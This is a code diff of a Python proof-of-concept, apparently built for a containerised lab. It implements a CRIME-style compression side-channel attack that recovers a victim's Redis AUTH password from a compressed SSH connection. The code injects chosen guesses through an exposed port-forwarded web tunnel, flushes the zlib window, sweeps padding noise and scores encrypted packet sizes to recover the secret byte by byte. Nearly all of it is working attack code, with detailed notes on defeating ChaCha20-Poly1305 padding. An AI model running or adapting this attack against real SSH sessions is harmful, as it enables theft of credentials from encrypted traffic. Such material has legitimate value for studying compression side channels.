@@ -1,31 +1,32 @@
 """CRIME-style chosen-payload attack against SSH compression.
 
-The PoC sits inside the attacker container and runs entirely passively
-at the wire layer: it never decrypts SSH, never runs its own zlib, and
-never asks the client for the secret value.  All it does is
+Realistic port-forward variant
+------------------------------
+The victim tunnels Redis (credentials) and an internal web server (cat
+pictures) through one compressed SSH connection.  The web tunnel's local
+port is bound to 0.0.0.0 and therefore reachable from the attacker's
+network.
 
-  1. Trigger the client to push the secret onto its session channel
-     (this refreshes the LZ77 sliding window so the secret sits at a
-     known, *small*, near-constant distance for the next measurement).
-  2. Trigger the client to send a chosen guess on the *other* session
-     channel.  The two channels share one zlib compression context per
-     direction, so the LZ77 dictionary populated by step 1 is visible
-     to step 2.
-  3. Read the size of the resulting encrypted SSH binary packet from
-     the scapy AsyncSniffer running in the same container.
+The attacker injects data by opening TCP connections to the victim's
+web tunnel port.  Data sent on those connections enters the SSH tunnel
+as ``direct-tcpip`` channel data in the **client-to-server** direction,
+sharing the zlib compression context with the victim's Redis
+``AUTH <password>`` traffic on the other tunnel.
 
-The right guess shares one extra byte with the secret in the LZ77
-match-extension step, so its compressed payload is one byte smaller
-than every wrong guess's.  chacha20-poly1305@openssh.com pads to
-multiples of 8 bytes, so a 1-byte difference is invisible most of the
-time -- but for at least one of the 8 possible alignments it crosses a
-padding boundary and shows up as an 8-byte step on the wire.  We sweep
-all 8 alignments by appending random noise of length 0..7 to each guess
-and summing the wire sizes; the candidate with the smallest sum is the
-recovered byte.
+Repeat-until-confident strategy
+-------------------------------
+Each byte position is recovered by sweeping 8 noise lengths (0..7) per
+round and accumulating candidate sums across rounds.  After each round
+the margin (difference between best and second-best sum) is checked.
+If the margin exceeds a configurable threshold (default 16 wire bytes),
+the position is considered resolved.  Otherwise another round is run
+with fresh tunnel connections whose CHANNEL_OPEN bit-alignment jitter
+is independent of previous rounds, so the compression signal accumulates
+while the jitter averages out.
 
-(This is the same idea as BREACH's "two tries" technique, tuned for
-SSH BPP + chacha20-poly1305@openssh.com.)
+This makes the attack robust against the per-connection alignment noise
+inherent in the port-forward scenario without requiring a fixed large
+noise sweep that might still land entirely in one padding bin.
 """
 
 from __future__ import annotations
@@ -42,142 +43,129 @@ import aiohttp
 LOG = logging.getLogger("attack")
 
 CLIENT_BASE = os.environ.get("CLIENT_CONTROL_URL", "http://client:8000")
+CLIENT_HOST = os.environ.get("CLIENT_HOST", "client")
+WEB_TUNNEL_PORT = int(os.environ.get("WEB_TUNNEL_PORT", "8080"))
 LISTEN_PORT = int(os.environ.get("LISTEN_PORT", "2222"))
 
 
-def _c2s_total(records: list[dict[str, Any]]) -> int:
-    """Sum c->s TCP payload bytes from one half of the forwarder.
+# ---------------------------------------------------------------------------
+# helpers
+# ---------------------------------------------------------------------------
 
-    The MitM relays each SSH binary packet through both legs of the
-    proxy, so summing every TCP segment would double-count.  We pick
-    the half-flow where dport == LISTEN_PORT (client -> attacker) and
-    ignore the other side.  Also drops pure-ACK segments (payload=0).
-    """
+def _c2s_total(records: list[dict[str, Any]]) -> int:
+    """Sum c->s TCP payload bytes from one half of the forwarder."""
     return sum(
         r["tcp_payload_len"] for r in records
         if r["dport"] == LISTEN_PORT and r["tcp_payload_len"] > 0
     )
 
 
-async def _refresh_secret(
-    session: aiohttp.ClientSession,
-    packet_log,
-    settle: float,
-) -> None:
-    """Trigger the client to push the secret onto the secret channel.
-
-    This refreshes the LZ77 sliding window so the secret sits at the
-    *most recent* end of the dictionary.  We do it before every guess
-    so the LZ77 distance for the prefix match is approximately the
-    same for the right and wrong candidates -- the only signal we
-    want is the +1 length advantage from the matching byte.
-    """
-    packet_log.clear()
-    async with session.post(f"{CLIENT_BASE}/send_secret") as r:
-        await r.read()
-    if settle > 0:
-        await asyncio.sleep(settle)
+async def _open_tunnel(retries: int = 20, delay: float = 1.0):
+    """Open a TCP connection to the client's web tunnel."""
+    for attempt in range(1, retries + 1):
+        try:
+            return await asyncio.open_connection(CLIENT_HOST, WEB_TUNNEL_PORT)
+        except (OSError, ConnectionRefusedError) as exc:
+            if attempt < retries:
+                LOG.warning("tunnel connect attempt %d: %s", attempt, exc)
+                await asyncio.sleep(delay)
+            else:
+                raise
+    raise RuntimeError("unreachable")
 
 
-async def _measure(
-    session: aiohttp.ClientSession,
-    packet_log,
-    payload: bytes,
-    settle: float,
-) -> int:
-    """Trigger the client to send a payload, return total c->s wire bytes."""
-    packet_log.clear()
-    async with session.post(
-        f"{CLIENT_BASE}/send_attacker_payload",
-        data=payload,
-    ) as r:
-        await r.read()
-    if settle > 0:
-        await asyncio.sleep(settle)
-    return _c2s_total(packet_log.snapshot())
-
-
-async def _flush_window(
-    session: aiohttp.ClientSession,
-    packet_log,
-    flush_bytes: int,
-    settle: float,
-) -> None:
-    """Push enough dummy bytes through the attacker channel to evict the
-    prior guess from the LZ77 sliding window AND scramble zlib's
-    internal hash-chain state.
-
-    Two requirements on the dummy:
-
-    1. **Length >= zlib window (32 KiB).**  Anything within 32 KiB of
-       the new guess is still in the LZ77 sliding window and could be
-       picked as a long backreference -- the previous guess BPP message
-       is identical to the new one at every byte except the candidate
-       byte, so without flushing the new guess just back-references
-       the entire previous guess and there's no signal left.
-
-    2. **Content must be random, NOT all-zeros.**  An all-zeros flush
-       saturates zlib's hash chain for the `\\x00\\x00\\x00` 3-byte
-       hash with thousands of in-window positions.  zlib's match
-       search walks that chain up to `max_chain_length` (128 at level
-       6) and gives up before reaching the optimal match position --
-       which produces *sub-optimal* compression in a way that depends
-       on the exact prior call sequence.  In the polluted state the
-       compressed-byte progression for the right candidate then
-       systematically skips the chacha20 padding boundary positions
-       and the wire signal disappears.
-
-       Random bytes don't share a common 3-byte hash, so every hash
-       chain stays short and zlib finds the optimal match.  The
-       compressed-byte progression matches the fresh-state predictions
-       and the wire signal is preserved.
-    """
-    if flush_bytes <= 0:
-        return
-    # secrets.token_bytes is cryptographically random; we don't need
-    # the strong-RNG guarantees but we do need *some* randomness.
-    dummy = secrets.token_bytes(flush_bytes)
-    async with session.post(
-        f"{CLIENT_BASE}/send_attacker_payload",
-        data=dummy,
-    ) as r:
-        await r.read()
-    if settle > 0:
-        await asyncio.sleep(settle)
+# 8-bit DEFLATE literals (codes 0..143) absent from dictionary content.
+_NOISE_POOL = list(range(0x80, 0x90))
 
 
 def _make_noise(noise_len: int) -> bytes:
-    """8-bit DEFLATE-literal noise (bytes 0x80..0x8F).
+    """8-bit DEFLATE-literal noise drawn from ``_NOISE_POOL``."""
+    if noise_len > len(_NOISE_POOL):
+        raise ValueError(f"noise_len {noise_len} > pool size {len(_NOISE_POOL)}")
+    return bytes(_NOISE_POOL[:noise_len])
 
-    Each noise byte adds *exactly* 8 bits = 1 byte to the compressed
-    output (modulo Z_PARTIAL_FLUSH alignment slack), so the cmp byte
-    count grows strictly linearly with no skipped values.  Sweeping
-    16 noise lengths reliably hits every cmp value in a 16-byte
-    range and therefore at least one chacha20 padding boundary --
-    at the boundary, cmp = boundary - 1 for the right candidate
-    and cmp = boundary for the wrong candidate, and that 1-byte
-    compressed delta becomes an 8-byte wire delta.
 
-    Constraints:
+# ---------------------------------------------------------------------------
+# single-round sweep
+# ---------------------------------------------------------------------------
 
-    * Each byte must be in the 8-bit fixed-Huffman literal class
-      (DEFLATE assigns 8-bit codes to literals 0..143 and 9-bit
-      codes to 144..255).  9-bit literals would shift the bit
-      alignment by 1 bit per noise byte and break the
-      strictly-linear cmp invariant.
-    * Each byte must be distinct so no 3-byte intra-noise LZ77
-      backreference can form.
-    * Bytes must not appear in any plausible dictionary content
-      (zeros, ASCII, IGNORE filler, SSH BPP wrappers) -- otherwise
-      LZ77 might find a coincidental match and the noise byte
-      would compress to nothing.
+async def _sweep_round(
+    session: aiohttp.ClientSession,
+    packet_log,
+    prefix: bytes,
+    alphabet: list[bytes],
+    noise_lengths: list[int],
+    settle: float,
+    flush_bytes: int,
+) -> dict[bytes, int]:
+    """Run one noise-length sweep and return per-candidate wire-byte sums.
 
-    The slice 0x80..0x8F satisfies all three.
+    Each (candidate, noise_length) iteration opens a **fresh** web-tunnel
+    connection for flush and measure.  The CHANNEL_OPEN for each fresh
+    connection has a different originator port, giving a random
+    bit-alignment offset that varies between rounds — which is why
+    repeating rounds lets the real signal accumulate while jitter
+    averages out.
+
+    Ordering within one iteration:
+
+      1. Flush -- throwaway tunnel, 33 KiB random bytes.
+      2. Open the measure tunnel -- CHANNEL_OPEN enters the compressor
+         *before* the secret.
+      3. Settle -- let CHANNEL_OPEN reach the sniffer.
+      4. Trigger Redis AUTH -- secret enters compressor right before the
+         guess, with no channel-management bytes in between.
+      5. Settle.
+      6. Clear packet log.
+      7. Write guess on the measure tunnel.
+      8. Settle.
+      9. Read packet log.
     """
-    if noise_len > 16:
-        raise ValueError("noise_len too long for the 0x80..0x8F slice")
-    return bytes(range(0x80, 0x80 + noise_len))
+    sums: dict[bytes, int] = {c: 0 for c in alphabet}
+    for noise_len in noise_lengths:
+        noise = _make_noise(noise_len)
+        for cb in alphabet:
+            # 1. Flush (throwaway connection) -------------------------------
+            flush_data = secrets.token_bytes(flush_bytes)
+            try:
+                _, fw = await _open_tunnel()
+                fw.write(flush_data)
+                await fw.drain()
+            except (ConnectionResetError, BrokenPipeError, OSError):
+                pass
+            if settle > 0:
+                await asyncio.sleep(settle)
 
+            # 2-3. Open measure tunnel, let CHANNEL_OPEN settle ------------
+            _, mw = await _open_tunnel()
+            if settle > 0:
+                await asyncio.sleep(settle)
+
+            # 4-5. Refresh secret ------------------------------------------
+            async with session.post(f"{CLIENT_BASE}/send_secret") as r:
+                await r.read()
+            if settle > 0:
+                await asyncio.sleep(settle)
+
+            # 6-9. Clear, guess, settle, read ------------------------------
+            packet_log.clear()
+            mw.write(prefix + cb + noise)
+            await mw.drain()
+            if settle > 0:
+                await asyncio.sleep(settle)
+            sums[cb] += _c2s_total(packet_log.snapshot())
+
+            try:
+                mw.close()
+            except Exception:  # noqa: BLE001
+                pass
+
+    return sums
+
+
+# ---------------------------------------------------------------------------
+# per-position recovery with repeat-until-confident
+# ---------------------------------------------------------------------------
 
 async def crack_byte_position(
     session: aiohttp.ClientSession,
@@ -187,93 +175,84 @@ async def crack_byte_position(
     noise_lengths: list[int],
     settle: float,
     flush_bytes: int,
+    min_margin: int,
+    max_rounds: int,
     log_prefix: str,
 ) -> tuple[bytes, dict[bytes, int]]:
-    """Recover one byte at the given position by candidate scoring.
+    """Recover one byte, repeating rounds until *margin >= min_margin*.
 
-    For each candidate and each noise length, the attack runs:
-
-      1. Flush the LZ77 window with random bytes so prior guesses
-         can't be matched as long backreferences and so zlib's hash
-         chain for any single 3-byte sequence stays short.
-      2. Refresh the secret so it sits at the most-recent end of the
-         (now-clean) dictionary, at a constant small distance for
-         every candidate.
-      3. Send `prefix + candidate + noise` and record the encrypted
-         c->s wire bytes.
-
-    The candidate with the smallest sum across all noise lengths is
-    the recovered byte.
-
-    Correctness: the right answer matches the secret with length L+1
-    while a wrong answer matches length L plus a literal byte.  In
-    DEFLATE fixed-Huffman the worst-case length-code-class transition
-    adds only 1 bit, so the right answer is *always* at least 7 bits
-    cheaper.  After Z_PARTIAL_FLUSH byte alignment a 7-bit saving
-    sometimes hides inside the alignment slack, but a wrong candidate
-    can *never* be cheaper than the right one -- only equal.
-    Sixteen 8-bit-literal noise lengths reliably surface the saving
-    as an 8-byte wire delta at *some* noise length.
+    Each round sweeps all noise lengths with fresh tunnel connections.
+    Candidate sums accumulate across rounds.  Because each round's
+    CHANNEL_OPEN alignment jitter is independent, the real compression
+    signal (7-8 bits per correct candidate) grows linearly with rounds
+    while the jitter grows as sqrt(rounds).
     """
     sums: dict[bytes, int] = {c: 0 for c in alphabet}
-    for noise_len in noise_lengths:
-        # Same noise bytes for every candidate at this length so the
-        # per-candidate comparison is fair.
-        noise = _make_noise(noise_len)
-        for cb in alphabet:
-            await _flush_window(session, packet_log, flush_bytes, settle)
-            await _refresh_secret(session, packet_log, settle)
-            payload = prefix + cb + noise
-            sums[cb] += await _measure(
-                session, packet_log, payload, settle,
-            )
 
-    ranked = sorted(sums.items(), key=lambda kv: kv[1])
-    best, best_sum = ranked[0]
-    second, second_sum = ranked[1]
-    LOG.info(
-        "%s best=%r sum=%d  2nd=%r sum=%d  margin=%d",
-        log_prefix,
-        best.decode("latin-1"), best_sum,
-        second.decode("latin-1"), second_sum,
-        second_sum - best_sum,
-    )
+    for rnd in range(1, max_rounds + 1):
+        round_sums = await _sweep_round(
+            session, packet_log, prefix, alphabet,
+            noise_lengths, settle, flush_bytes,
+        )
+        for c in alphabet:
+            sums[c] += round_sums[c]
+
+        ranked = sorted(sums.items(), key=lambda kv: kv[1])
+        best, best_sum = ranked[0]
+        second, second_sum = ranked[1]
+        margin = second_sum - best_sum
+
+        LOG.info(
+            "%s round=%d best=%r sum=%d  2nd=%r sum=%d  margin=%d",
+            log_prefix, rnd,
+            best.decode("latin-1"), best_sum,
+            second.decode("latin-1"), second_sum,
+            margin,
+        )
+        if margin >= min_margin:
+            break
+    else:
+        LOG.warning("%s margin=%d after %d rounds (threshold=%d)",
+                    log_prefix, margin, max_rounds, min_margin)
+
     return best, sums
 
 
+# ---------------------------------------------------------------------------
+# full attack
+# ---------------------------------------------------------------------------
+
 async def run_attack(
     packet_log,
-    known_prefix: bytes,
+    known_prefix: bytes = b"AUTH ",
     alphabet_str: str = "abcdefghijklmnopqrstuvwxyz0123456789",
     max_length: int = 32,
     noise_lengths: list[int] | None = None,
-    terminator: bytes = b"\n",
-    settle: float = 0.005,
+    terminator: bytes = b"\r",
+    settle: float = 0.01,
     flush_bytes: int = 33000,
+    min_margin: int = 16,
+    max_rounds: int = 16,
 ) -> dict[str, Any]:
     if noise_lengths is None:
-        # 0..15 spans two chacha20-poly1305@openssh.com padding bins
-        # and gives every (cand, noise_len) sweep enough alignment
-        # coverage to expose either an 8-bit or a 7-bit per-candidate
-        # signal as a wire-side delta.  crack_byte_position() runs the
-        # 8-bit-literal sweep first, then falls back to a 9-bit sweep
-        # only if the first one was a tie.
-        noise_lengths = list(range(16))
+        noise_lengths = list(range(8))
     alphabet = [bytes([c]) for c in alphabet_str.encode("utf-8")]
     if terminator not in alphabet:
         alphabet.append(terminator)
 
     LOG.info(
-        "starting attack: known_prefix=%r alphabet_size=%d noise_lengths=%s "
-        "max_length=%d settle=%.3f flush_bytes=%d",
-        known_prefix, len(alphabet), noise_lengths, max_length, settle,
-        flush_bytes,
+        "starting attack: known_prefix=%r alphabet_size=%d "
+        "noise_lengths=%s settle=%.3f flush_bytes=%d "
+        "min_margin=%d max_rounds=%d",
+        known_prefix, len(alphabet), noise_lengths, settle,
+        flush_bytes, min_margin, max_rounds,
     )
 
     started = time.time()
     recovered = b""
     history: list[dict[str, Any]] = []
-    timeout = aiohttp.ClientTimeout(total=600)
+
+    timeout = aiohttp.ClientTimeout(total=1800)
     async with aiohttp.ClientSession(timeout=timeout) as session:
         for pos in range(max_length):
             best, sums = await crack_byte_position(
@@ -283,6 +262,8 @@ async def run_attack(
                 noise_lengths=noise_lengths,
                 settle=settle,
                 flush_bytes=flush_bytes,
+                min_margin=min_margin,
+                max_rounds=max_rounds,
                 log_prefix=f"pos {pos:2d}",
             )
             ranked = [
@@ -292,13 +273,14 @@ async def run_attack(
             history.append({
                 "position": pos,
                 "best": best.decode("latin-1"),
-                "ranked": ranked[:6],  # top 6 to keep response small
+                "ranked": ranked[:6],
             })
             if best == terminator:
                 LOG.info("hit terminator at position %d -> done", pos)
                 break
             recovered += best
-            LOG.info("recovered so far: %r", recovered.decode("latin-1"))
+            LOG.info("recovered so far: %r",
+                     recovered.decode("latin-1"))
         else:
             LOG.warning("hit max_length=%d without terminator", max_length)
 
